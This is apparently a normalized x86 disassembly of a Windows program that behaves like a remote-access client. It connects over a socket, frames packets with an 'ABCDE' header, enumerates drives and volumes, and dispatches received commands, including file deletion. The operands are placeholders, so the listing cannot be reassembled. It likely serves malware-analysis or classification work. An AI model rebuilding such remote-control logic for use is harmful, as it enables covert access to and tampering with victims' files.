sub_401000
push esi
mov esi ecx
mov eax [ esi + 0xc ]
mov [ esi ] r--data
test eax eax
je r-xdata
test [ esp + 0x8 ] 0x1
je r-xdata
push 0x8000
push 0x0
push eax
call [ VirtualFree@IAT ]
mov eax esi
pop esi
retn 0x4
push esi
call sub_40a5fb
add esp 0x4
sub_401040
push ebp
mov ebp esp
and esp 0xffffffc0
sub esp 0x38
push ebx
push esi
cmp eax [ edi + 0x8 ]
jae r-xdata
mov [ esp + 0x38 ] eax
fild [ esp + 0x38 ]
test eax eax
jge r-xdata
xor eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn
fmul [ r--data ]
sub esp 0x8
fstp [ esp ]
call sub_414dc0
fnstcw [ esp + 0x3e ]
add esp 0x8
movzx eax [ esp + 0x36 ]
or eax 0xc00
mov [ esp + 0x38 ] eax
push 0x4
push 0x1000
fldcw [ esp + 0x40 ]
fistp [ esp + 0x40 ]
mov esi [ esp + 0x40 ]
shl esi 0x7
push esi
fldcw [ esp + 0x42 ]
push 0x0
call [ VirtualAlloc@IAT ]
mov ecx eax
mov eax [ edi + 0xc ]
mov [ esp + 0x38 ] ecx
test eax eax
jne r-xdata
fadd [ r--data ]
mov ebx [ edi + 0x4 ]
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0x38 ]
mov [ edi + 0xc ] eax
mov [ edi + 0x8 ] esi
mov eax esi
pop esi
mov [ edi + 0x4 ] ebx
pop ebx
mov esp ebp
pop ebp
retn
push 0x8000
push 0x0
push eax
call [ VirtualFree@IAT ]
push ebx
push eax
push ecx
call sub_41a3c0
mov eax [ edi + 0xc ]
add esp 0xc
test eax eax
je r-xdata
sub_401100
push ecx
push edi
mov edi eax
cmp [ edi + 0xc ] 0x0
jne r-xdata
mov eax [ edi + 0x4 ]
xor eax eax
jmp r-xdata
add eax esi
call sub_401040
mov ecx [ edi + 0xc ]
mov eax [ esp + 0xc ]
add ecx [ edi + 0x4 ]
push esi
push eax
push ecx
call sub_41a3c0
add esp 0xc
add [ edi + 0x4 ] esi
mov eax esi
pop edi
pop ecx
retn 0x4
sub_401140
push esi
push edi
mov edi eax
mov esi ecx
cmp edi [ esi + 0x8 ]
jbe r-xdata
mov eax [ esi + 0xc ]
test eax eax
jne r-xdata
xor eax eax
pop edi
pop esi
retn 0x4
mov ecx [ esi + 0x4 ]
xor ecx ecx
jmp r-xdata
test edi edi
je r-xdata
test eax eax
jne r-xdata
cmp edi ecx
jbe r-xdata
cmp [ esi + 0xc ] 0x0
jne r-xdata
push edi
push eax
mov eax [ esp + 0x14 ]
push eax
call sub_41a3c0
mov eax [ esi + 0xc ]
add esp 0xc
test eax eax
jne r-xdata
mov edi [ esi + 0x4 ]
xor edi edi
jmp r-xdata
mov ecx [ esi + 0x4 ]
call sub_4011d0
mov eax edi
pop edi
pop esi
retn 0x4
xor ecx ecx
call sub_4011d0
mov eax edi
pop edi
pop esi
retn 0x4
mov ecx [ esi + 0x4 ]
xor ecx ecx
jmp r-xdata
sub ecx edi
push ecx
lea ecx [ eax + edi ]
push ecx
push eax
call sub_414a50
add esp 0xc
sub [ esi + 0x4 ] edi
sub_4011d0
push ebp
mov ebp esp
and esp 0xffffffc0
sub esp 0x38
cmp [ esi + 0xc ] 0x0
push ebx
push edi
jne r-xdata
mov eax [ esi + 0x4 ]
mov [ esp + 0x34 ] eax
cmp ecx eax
jae r-xdata
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x38 ] ecx
fild [ esp + 0x38 ]
test ecx ecx
jge r-xdata
pop edi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
fmul [ r--data ]
sub esp 0x8
fstp [ esp ]
call sub_414dc0
fnstcw [ esp + 0x3a ]
add esp 0x8
movzx eax [ esp + 0x32 ]
or eax 0xc00
mov [ esp + 0x38 ] eax
fldcw [ esp + 0x38 ]
fistp [ esp + 0x38 ]
mov edi [ esp + 0x38 ]
shl edi 0x7
fldcw [ esp + 0x32 ]
cmp edi [ esi + 0x8 ]
jb r-xdata
fadd [ r--data ]
push 0x4
push 0x1000
push edi
push 0x0
call [ VirtualAlloc@IAT ]
mov ecx [ esi + 0xc ]
mov ebx eax
mov eax [ esp + 0x34 ]
push eax
push ecx
push ebx
call sub_41a3c0
mov edx [ esi + 0xc ]
add esp 0xc
push 0x8000
push 0x0
push edx
call [ VirtualFree@IAT ]
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] edi
mov eax edi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
sub_4012c0
sub esp 0x1a8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1a0 ] eax
mov [ esi ] r--data
push ebx
xor ebx ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov eax r--data
mov [ esi + 0x4 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] eax
mov [ esi + 0x28 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x30 ] ebx
mov [ esi + 0x34 ] eax
lea eax [ esp + 0x8 ]
push eax
push 0x202
mov [ esi + 0x38 ] ebx
mov [ esi + 0x3c ] ebx
mov [ esi + 0x40 ] ebx
call [ WSAStartup@IAT ]
push ebx
push ebx
push 0x1
push ebx
call [ CreateEventW@IAT ]
or ecx 0xffffffff
mov [ esi + 0x58 ] eax
mov [ esi + 0x50 ] ecx
mov [ esp + 0x19c ] 0x41
mov [ esp + 0x19d ] 0x42
mov [ esp + 0x19e ] 0x43
mov [ esp + 0x19f ] 0x44
mov edx [ esp + 0x19c ]
mov [ esi + 0x44 ] ecx
mov ecx [ esp + 0x1a4 ]
mov [ esi + 0x54 ] bl
mov al 0x45
pop ebx
mov [ esi + 0x48 ] edx
mov [ esi + 0x4c ] al
xor ecx esp
mov eax esi
call sub_414a33
add esp 0x1a8
retn
sub_4013b0
push esi
mov esi ecx
mov eax [ esi + 0x44 ]
push edi
push 0xffffffff
push eax
mov [ esi ] r--data
mov [ esi + 0x54 ] 0x0
call [ WaitForSingleObject@IAT ]
cmp [ esi + 0x50 ] 0xffffffff
je r-xdata
mov ecx [ esi + 0x44 ]
mov edi [ CloseHandle@IAT ]
push ebx
push ecx
call edi
mov edx [ esi + 0x58 ]
push edx
call edi
call [ WSACleanup@IAT ]
mov eax [ esi + 0x40 ]
mov edi [ VirtualFree@IAT ]
mov ebx r--data
mov [ esi + 0x34 ] ebx
test eax eax
je r-xdata
call sub_401450
mov eax [ esi + 0x30 ]
mov [ esi + 0x24 ] ebx
test eax eax
je r-xdata
push 0x8000
push 0x0
push eax
call edi
mov eax [ esi + 0x20 ]
mov [ esi + 0x14 ] ebx
test eax eax
je r-xdata
push 0x8000
push 0x0
push eax
call edi
mov [ esi + 0x4 ] ebx
mov esi [ esi + 0x10 ]
pop ebx
test esi esi
je r-xdata
push 0x8000
push 0x0
push eax
call edi
pop edi
pop esi
retn
push 0x8000
push 0x0
push esi
call edi
sub_401450
push ecx
push 0x4
lea edx [ esp + 0x4 ]
push edx
mov eax 0x1
push 0x80
mov [ esp + 0xc ] ax
mov eax [ esi + 0x50 ]
push 0xffff
xor ecx ecx
push eax
mov [ esp + 0x16 ] cx
call [ setsockopt@IAT ]
mov ecx [ esi + 0x50 ]
push ecx
call [ CancelIo@IAT ]
push 0x0
lea edx [ esi + 0x54 ]
push edx
call [ InterlockedExchange@IAT ]
mov eax [ esi + 0x50 ]
push eax
call [ closesocket@IAT ]
mov ecx [ esi + 0x58 ]
push ecx
call [ SetEvent@IAT ]
mov [ esi + 0x50 ] 0xffffffff
pop ecx
retn
sub_4014b0
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
push esi
push edi
mov esi ecx
call sub_401450
mov eax [ esi + 0x58 ]
push eax
call [ ResetEvent@IAT ]
push 0x6
push 0x1
push 0x2
mov [ esi + 0x54 ] 0x0
call [ socket@IAT ]
mov [ esi + 0x50 ] eax
test ebx ebx
je r-xdata
xor eax eax
push ebx
call [ lstrlenW@IAT ]
inc eax
cmp eax 0x3fffffff
jg r-xdata
mov eax [ ebp + 0x8 ]
mov edx 0x2
push eax
mov [ ebp - 0x18 ] dx
call [ htons@IAT ]
mov [ ebp - 0x16 ] ax
mov ecx [ edi + 0xc ]
mov edx [ ecx ]
mov eax [ edx ]
mov edx [ esi + 0x50 ]
push 0x10
lea ecx [ ebp - 0x18 ]
push ecx
push edx
mov [ ebp - 0x14 ] eax
call [ connect@IAT ]
cmp eax 0xffffffff
je r-xdata
xor al al
jmp r-xdata
add eax eax
mov [ ebp - 0x20 ] eax
call sub_4227d0
mov edi esp
test edi edi
je r-xdata
mov ecx [ esi + 0x50 ]
push 0x1
lea eax [ ebp - 0x19 ]
push eax
push 0x8
push 0xffff
push ecx
mov [ ebp - 0x19 ] 0x1
call [ setsockopt@IAT ]
test eax eax
jne r-xdata
lea esp [ ebp - 0x34 ]
pop edi
pop esi
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_414a33
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x20 ]
push 0x0
push 0x0
push ecx
push edi
push 0xffffffff
push ebx
push 0x0
push 0x3
mov [ edi ] 0x0
call [ WideCharToMultiByte@IAT ]
neg eax
sbb eax eax
and eax edi
jmp r-xdata
mov dl 0x1
mov ecx esi
mov eax sub_401600
mov [ esi + 0x54 ] 0x1
call sub_404a60
mov [ esi + 0x44 ] eax
mov al 0x1
mov ecx [ esi + 0x50 ]
push eax
push eax
lea edx [ ebp - 0x19 ]
push edx
push eax
push eax
push 0xc
lea eax [ ebp - 0x2c ]
push eax
push 0x98000004
push ecx
mov [ ebp - 0x2c ] 0x1
mov [ ebp - 0x28 ] 0x2bf20
mov [ ebp - 0x24 ] 0x1388
call [ WSAIoctl@IAT ]
push eax
call [ gethostbyname@IAT ]
mov edi eax
test edi edi
jne r-xdata
sub_401600
mov eax 0x2220
call sub_4185c0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x221c ] eax
push ebx
mov ebx [ esp + 0x2228 ]
cmp [ ebx + 0x54 ] 0x0
mov eax [ ebx + 0x50 ]
push ebp
lea ebp [ ebx + 0x54 ]
push esi
push edi
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] 0x1
je r-xdata
mov ecx [ esp + 0x222c ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
or eax 0xffffffff
call sub_414a33
add esp 0x2220
retn 0x4
nop
push 0x4
lea ecx [ esp + 0x18 ]
push ecx
mov edx 0x1
push 0x80
mov [ esp + 0x20 ] dx
mov edx [ ebx + 0x50 ]
push 0xffff
xor eax eax
push edx
mov [ esp + 0x2a ] ax
call [ setsockopt@IAT ]
mov eax [ ebx + 0x50 ]
push eax
call [ CancelIo@IAT ]
push 0x0
push ebp
call [ InterlockedExchange@IAT ]
mov ecx [ ebx + 0x50 ]
push ecx
call [ closesocket@IAT ]
mov edx [ ebx + 0x58 ]
push edx
jmp r-xdata
test eax eax
jle r-xdata
call [ SetEvent@IAT ]
mov [ ebx + 0x50 ] 0xffffffff
cmp [ ebp ] 0x0
jne r-xdata
push 0x2000
lea edx [ esp + 0x22c ]
push 0x0
push edx
call sub_415f60
mov ecx [ ebx + 0x50 ]
add esp 0xc
push 0x0
push 0x2000
lea eax [ esp + 0x230 ]
push eax
push ecx
call [ recv@IAT ]
test eax eax
jle r-xdata
push 0x0
push 0x0
mov ecx 0x41
lea esi [ esp + 0x20 ]
lea edi [ esp + 0x128 ]
[ edi ] [ esi ]
push 0x0
lea ecx [ esp + 0x12c ]
push ecx
push 0x0
call [ select@IAT ]
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
push 0x4
lea edx [ esp + 0x18 ]
push edx
mov eax 0x1
push 0x80
mov [ esp + 0x20 ] ax
mov eax [ ebx + 0x50 ]
push 0xffff
xor ecx ecx
push eax
mov [ esp + 0x2a ] cx
call [ setsockopt@IAT ]
mov ecx [ ebx + 0x50 ]
push ecx
call [ CancelIo@IAT ]
push 0x0
push ebp
call [ InterlockedExchange@IAT ]
mov edx [ ebx + 0x50 ]
push edx
call [ closesocket@IAT ]
mov eax [ ebx + 0x58 ]
push eax
push ebx
mov edx eax
lea ecx [ esp + 0x22c ]
call sub_401790
sub_401790
push ebp
mov ebp esp
push 0xffffffff
push sub_426080
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx edx
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x4 ] 0x0
test ebx ebx
jne r-xdata
cmp ebx 0x5
jne r-xdata
call sub_401450
cmp [ esi + 0x10 ] 0x0
lea edi [ esi + 0x4 ]
jne r-xdata
mov edx [ ecx ]
cmp edx [ esi + 0x48 ]
lea eax [ esi + 0x48 ]
jne r-xdata
mov eax [ edi + 0x4 ]
xor eax eax
jmp r-xdata
add eax 0x4
mov al [ eax ]
cmp al [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_414a33
mov esp ebp
pop ebp
retn 0x4
cmp [ edi + 0x4 ] 0xd
jbe r-xdata
add eax ebx
call sub_401040
mov eax [ edi + 0xc ]
mov edx [ ebp - 0x24 ]
add eax [ edi + 0x4 ]
push ebx
push edx
push eax
call sub_41a3c0
add esp 0xc
add [ edi + 0x4 ] ebx
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x10 ]
mov edx [ eax ]
mov bl [ eax + 0x4 ]
lea ecx [ esi + 0x48 ]
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x18 ] bl
cmp [ ecx ] edx
jne r-xdata
mov eax [ esi + 0x38 ]
mov ecx [ esi + 0x40 ]
push eax
push ecx
push esi
call sub_401a10
jmp r-xdata
mov ecx [ esi + 0x40 ]
xor eax eax
push eax
push ecx
push esi
call sub_401a10
jmp r-xdata
push r--data
lea ecx [ ebp - 0x34 ]
push ecx
mov [ ebp - 0x34 ] r--data
call sub_415cca
mov esi [ ebp - 0x28 ]
lea eax [ esi + 0x4 ]
call sub_4012a0
push 0x0
push 0x0
push esi
call sub_401a10
mov eax r-xdata
retn
add ecx 0x4
cmp bl [ ecx ]
jne r-xdata
mov eax [ eax + 0x5 ]
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
cmp [ edi + 0xc ] 0x0
jne r-xdata
mov ecx [ edi + 0x4 ]
xor ecx ecx
jmp r-xdata
lea ecx [ ebp - 0x1c ]
push ecx
mov eax 0x5
mov ecx edi
mov [ ebp - 0x2c ] 0x0
call sub_401140
lea edx [ ebp - 0x20 ]
push edx
mov eax 0x4
mov ecx edi
call sub_401140
lea eax [ ebp - 0x2c ]
push eax
mov eax 0x4
mov ecx edi
call sub_401140
mov esi [ ebp - 0x20 ]
add esi 0xfffffff3
push esi
call sub_40a606
mov ecx [ ebp - 0x2c ]
add esp 0x4
mov ebx eax
push ecx
mov [ ebp - 0x30 ] ebx
call sub_40a606
add esp 0x4
mov [ ebp - 0x20 ] eax
test ebx ebx
je r-xdata
cmp ecx eax
jb r-xdata
push r--data
lea eax [ ebp - 0x38 ]
push eax
mov [ ebp - 0x38 ] r--data
call sub_415cca
test eax eax
je r-xdata
push ebx
mov eax esi
mov ecx edi
call sub_401140
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x2c ]
push esi
push ebx
lea eax [ ebp - 0x24 ]
push eax
push ecx
mov [ ebp - 0x24 ] edx
call sub_404b50
add esp 0x10
test eax eax
jne r-xdata
push r--data
lea edx [ ebp - 0x3c ]
push edx
mov [ ebp - 0x3c ] r--data
call sub_415cca
mov ebx [ ebp - 0x28 ]
add ebx 0x14
mov eax ebx
call sub_4012a0
mov edx [ ebp - 0x20 ]
mov esi [ ebp - 0x24 ]
push edx
mov eax ebx
call sub_401100
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebx + 0x4 ]
xor ebx ebx
jmp r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
mov ecx [ eax + 0x5c ]
mov edx [ ecx ]
mov eax [ eax + 0x20 ]
mov edx [ edx + 0x4 ]
push ebx
push eax
call edx
mov eax [ ebp - 0x30 ]
push eax
call sub_40a5fb
mov ecx [ ebp - 0x20 ]
add esp 0x4
push ecx
call sub_40a5fb
mov esi [ ebp - 0x28 ]
add esp 0x4
jmp r-xdata
sub_401a10
sub esp 0x10
push ebx
push ebp
mov ebp [ esp + 0x24 ]
push esi
push edi
mov edi [ esp + 0x24 ]
lea ebx [ edi + 0x24 ]
mov ecx 0x80
mov esi ebx
mov [ ebx + 0x4 ] 0x0
call sub_4011d0
test ebp ebp
jbe r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebp
mov [ esp + 0x2c ] eax
fild [ esp + 0x2c ]
test eax eax
jge r-xdata
mov eax [ ebx + 0x4 ]
xor eax eax
jmp r-xdata
fmul [ r--data ]
fnstcw [ esp + 0x2c ]
movzx eax [ esp + 0x2c ]
fadd [ r--data ]
or eax 0xc00
mov [ esp + 0x14 ] eax
fldcw [ esp + 0x14 ]
fistp [ esp + 0x18 ]
mov eax [ esp + 0x18 ]
push eax
fldcw [ esp + 0x30 ]
mov [ esp + 0x30 ] eax
call sub_40a606
mov esi eax
add esp 0x4
mov [ esp + 0x18 ] esi
test esi esi
jne r-xdata
fadd [ r--data ]
mov eax [ esi + 0x4 ]
xor eax eax
jmp r-xdata
add eax 0x5
mov edi ebx
call sub_401040
mov eax [ ebx + 0xc ]
add eax [ ebx + 0x4 ]
mov ebp [ esp + 0x24 ]
mov edx [ ebp + 0x48 ]
mov [ eax ] edx
mov cl [ ebp + 0x4c ]
mov [ eax + 0x4 ] cl
add [ ebx + 0x4 ] 0x5
lea esi [ ebp + 0x34 ]
mov ecx 0x80
mov [ esi + 0x4 ] 0x0
call sub_4011d0
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov ecx [ esp + 0x28 ]
push ebp
push ecx
lea edx [ esp + 0x34 ]
push edx
push esi
call sub_404ca0
add esp 0x10
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn 0xc
mov ebx [ ebx + 0x4 ]
xor ebx ebx
jmp r-xdata
add eax 0x5
mov edi esi
call sub_401040
mov eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
mov edx [ ebp + 0x48 ]
mov [ eax ] edx
mov cl [ ebp + 0x4c ]
mov [ eax + 0x4 ] cl
add [ esi + 0x4 ] 0x5
mov eax [ esp + 0x2c ]
add eax 0xd
mov [ esp + 0x14 ] eax
add edi 0x48
push edi
mov esi 0x5
mov eax ebx
call sub_401100
cmp [ ebx + 0xc ] 0x0
jne r-xdata
push esi
call sub_40a5fb
add esp 0x4
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn 0xc
mov ecx [ esp + 0x24 ]
mov eax [ ecx + 0x30 ]
push ebx
push ecx
call sub_401c40
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn 0xc
mov eax [ ebx + 0x4 ]
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
xor eax eax
jmp r-xdata
add eax 0x4
mov edi ebx
call sub_401040
mov ecx [ ebx + 0xc ]
add ecx [ ebx + 0x4 ]
mov edx [ esp + 0x14 ]
mov [ ecx ] edx
mov esi 0x4
add [ ebx + 0x4 ] esi
cmp [ ebx + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
push edi
call sub_40a5fb
add esp 0x4
jmp r-xdata
add eax 0x4
call sub_401040
mov eax [ ebx + 0xc ]
add eax [ ebx + 0x4 ]
mov edi [ esp + 0x18 ]
mov [ eax ] ebp
add [ ebx + 0x4 ] esi
mov esi [ esp + 0x2c ]
push edi
mov eax ebx
call sub_401100
push edi
call sub_40a5fb
add esp 0x4
push ebp
call sub_40a606
mov ecx [ esp + 0x2c ]
add esp 0x4
push ebp
mov edi eax
push ecx
push edi
call sub_41a3c0
mov esi [ esp + 0x30 ]
add esi 0x34
add esp 0xc
mov ecx 0x80
mov [ esi + 0x4 ] 0x0
call sub_4011d0
mov eax [ esp + 0x24 ]
push edi
mov esi ebp
add eax 0x34
call sub_401100
test edi edi
je r-xdata
sub_401c40
push ecx
push ebx
mov ebx [ esp + 0x10 ]
push ebp
push esi
xor ebp ebp
xor esi esi
push edi
mov edi eax
mov [ esp + 0x10 ] ebp
cmp ebx 0x2000
jb r-xdata
test ebx ebx
jle r-xdata
jmp r-xdata
mov eax [ esp + 0x10 ]
cmp eax [ esp + 0x1c ]
je r-xdata
xor esi esi
cmp ebp 0xf
jge r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x8
or eax 0xffffffff
cmp ebp 0xf
je r-xdata
inc esi
cmp esi 0xf
jl r-xdata
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ eax + 0x50 ]
push 0x0
push 0x2000
push edi
push ecx
call [ send@IAT ]
mov esi eax
test esi esi
jg r-xdata
add [ esp + 0x10 ] eax
mov edx [ esp + 0x18 ]
mov eax [ edx + 0x50 ]
push 0x0
push ebx
push edi
push eax
call [ send@IAT ]
test eax eax
jg r-xdata
add [ esp + 0x10 ] esi
push 0xa
add edi 0x2000
call [ Sleep@IAT ]
sub ebx 0x2000
cmp ebx 0x2000
jae r-xdata
cmp ebp 0xf
inc ebp
cmp ebp 0xf
jl r-xdata
sub_401d60
push 0xffffffff
push sub_426038
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0x8 ] esi
call sub_414f8b
xor eax eax
mov [ esp + 0x14 ] eax
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
push 0xffffffff
mov [ ecx + 0x14 ] eax
mov [ ecx + 0x18 ] 0xf
push eax
mov [ ecx + 0x4 ] al
mov eax [ esp + 0x24 ]
push eax
call sub_403330
mov eax esi
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x10
retn 0x4
sub_401dd0
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0x24 ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x24 ] 0xf
mov [ esi + 0x20 ] eax
mov [ esi + 0x10 ] al
mov ecx esi
pop esi
jmp sub_41504f
mov eax [ esi + 0x10 ]
push eax
call sub_40a5fb
add esp 0x4
sub_401e20
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0x24 ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x24 ] 0xf
mov [ esi + 0x20 ] eax
mov ecx esi
mov [ esi + 0x10 ] al
call sub_41504f
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax [ esi + 0x10 ]
push eax
call sub_40a5fb
add esp 0x4
mov eax esi
pop esi
retn 0x4
push esi
call sub_40a5fb
add esp 0x4
sub_401e90
push 0xffffffff
push sub_426008
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0xc ] esi
mov edi [ esp + 0x20 ]
push edi
call sub_414ff2
xor edx edx
mov [ esp + 0x18 ] edx
push 0xffffffff
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
lea eax [ edi + 0xc ]
push edx
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] edx
push eax
mov [ ecx + 0x4 ] dl
call sub_403330
mov eax esi
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x10
retn 0x4
sub_401f10
push 0xffffffff
push sub_4261d5
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8 ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x1c ]
mov esi [ esp + 0x18 ]
push 0x0
push 0x0
push 0x1
mov [ esi ] r--data
mov [ esi + 0x4 ] eax
push 0x0
mov [ eax + 0x5c ] esi
call [ CreateEventW@IAT ]
mov [ esi + 0x8 ] eax
lea eax [ esi + 0x10 ]
mov [ esp + 0x10 ] 0x0
push eax
mov [ esi ] r--data
call sub_403140
mov [ esp + 0x10 ] 0x1
push esi
mov [ esi + 0x2c ] 0x0
call sub_402020
mov eax esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0xc
retn 0x8
sub_401fc0
push 0xffffffff
push sub_426198
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0x8 ] esi
mov [ esi ] r--data
lea eax [ esi + 0x10 ]
push eax
mov [ esp + 0x18 ] 0x0
call sub_4031b0
mov ecx [ esi + 0x8 ]
push ecx
mov [ esi ] r--data
call [ CloseHandle@IAT ]
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x10
retn
sub_402020
sub esp 0xee0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xedc ] eax
mov eax [ esp + 0xee4 ]
push ebx
push ebp
push esi
push edi
lea edx [ esp + 0x4e8 ]
push edx
mov ecx 0x67
push 0x200
mov [ esp + 0x2c ] eax
mov [ esp + 0x6f0 ] cx
call [ GetLogicalDriveStringsW@IAT ]
xor ebx ebx
lea esi [ esp + 0x4e8 ]
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] ebx
lea edi [ ebx + 0x1 ]
cmp [ esp + 0x4e8 ] bx
je r-xdata
mov edx [ esp + 0x24 ]
push edi
lea ecx [ esp + 0x6ec ]
call sub_404470
mov ecx [ esp + 0xeec ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_414a33
add esp 0xee0
retn 0x4
jmp r-xdata
push 0x208
lea eax [ esp + 0x2e4 ]
push ebx
push eax
call sub_415f60
add esp 0xc
push 0x104
lea ecx [ esp + 0x2e4 ]
push ecx
push ebx
push ebx
push ebx
push ebx
push ebx
push esi
call [ GetVolumeInformationW@IAT ]
push 0x410
push 0x2b4
lea edx [ esp + 0x30 ]
push edx
push 0x80
push esi
call [ SHGetFileInfoW@IAT ]
movzx eax [ esi ]
cmp ax 0x41
je r-xdata
xor ebp ebp
cmp ax 0x42
je r-xdata
xor ebx ebx
push ebx
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x18 ]
push ecx
push esi
call [ GetDiskFreeSpaceExW@IAT ]
test eax eax
je r-xdata
mov ebx [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
mov ebp [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
shrd ebx edx 0x14
shrd ebp eax 0x14
shr edx 0x14
shr eax 0x14
jmp r-xdata
movzx ecx [ esi ]
push esi
mov [ esp + edi * 2 + 0x6ec ] cx
call [ GetDriveTypeW@IAT ]
mov edx [ esp + 0x23c ]
movzx ecx [ esp + 0x244 ]
mov [ esp + edi * 2 + 0x6ea ] ax
mov eax [ esp + 0x240 ]
mov [ esp + edi * 2 + 0x6ec ] ebx
mov [ esp + edi * 2 + 0x6f4 ] ebp
mov [ esp + edi * 2 + 0x6fc ] edx
mov edx [ esp + 0x2e0 ]
mov [ esp + edi * 2 + 0x700 ] eax
mov eax [ esp + 0x2e4 ]
mov [ esp + edi * 2 + 0x704 ] cx
movzx ecx [ esp + 0x2e8 ]
mov [ esp + edi * 2 + 0x710 ] edx
mov [ esp + edi * 2 + 0x714 ] eax
mov [ esp + edi * 2 + 0x718 ] cx
push esi
add edi 0x1e
call [ lstrlenW@IAT ]
cmp [ esi + eax * 2 + 0x2 ] 0x0
lea esi [ esi + eax * 2 + 0x2 ]
jne r-xdata
sub_4021f0
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
movzx eax [ edi ]
add eax 0xfffffffe
mov ebx ecx
lea esi [ edi + 0x1 ]
cmp eax 0xd
ja r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
jmp [ eax * 4 + jump_table_4022fc ]
push ebx
mov ecx esi
call sub_402340
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push esi
call [ DeleteFileW@IAT ]
push esi
call sub_402540
jmp r-xdata
push ebx
call sub_402510
mov ecx esi
call sub_402630
push 0x1
lea ecx [ esp + 0x10 ]
mov edx ebx
mov [ esp + 0x10 ] 0x6f
call sub_404470
push ebx
mov ecx esi
call sub_4027e0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov esi ebx
call sub_402c20
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push ebx
mov ebx esi
call sub_402c50
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_402dd0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ esi ]
